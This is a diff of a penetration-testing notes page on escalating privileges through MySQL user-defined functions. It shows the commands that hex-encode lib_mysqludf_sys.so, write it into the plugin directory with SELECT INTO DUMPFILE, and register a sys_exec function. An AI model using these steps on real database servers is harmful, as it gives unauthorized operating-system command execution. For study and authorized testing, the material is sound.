@@ -7,19 +7,15 @@ description: PrivEsc with MySQL User Defined Functions
 If we can not access bash(or similar) shell but we can access mysql shell, you can upload library as hex format. The arch should be x86\_64 for this library file.
 
 ```
-$ xxd -p lib_mysqludf_sys.so | tr -d '\n' > lib_mysqludf_sys.so.hex 
+$ xxd -p lib_mysqludf_sys.so | tr -d '\n' > lib_mysqludf_sys.so.hex
+
 $ mysql --host=127.0.0.1 --port=3306 -u root -p
 
-MariaDB [(none)]> select @@plugin_dir; #show variables like '%plugin%';
-+-------------------+
-| @@plugin_dir      |
-+-------------------+
-| /home/dev/plugin/ |
-+-------------------+
+MariaDB [(none)]> select @@plugin_dir;  #(OR -> show variables like '%plugin%';)
 
 MariaDB [(none)]> set @shell = 0x{HEX FILE};
 
-MariaDB [(none)]> select binary @shell into dumpfile '/home/dev/plugin/udf_sys_exec.so';
+MariaDB [(none)]> select binary @shell into dumpfile '{plugin_directory}udf_sys_exec.so';
 
 MariaDB [(none)]> create function sys_exec returns int soname 'udf_sys_exec.so';
 
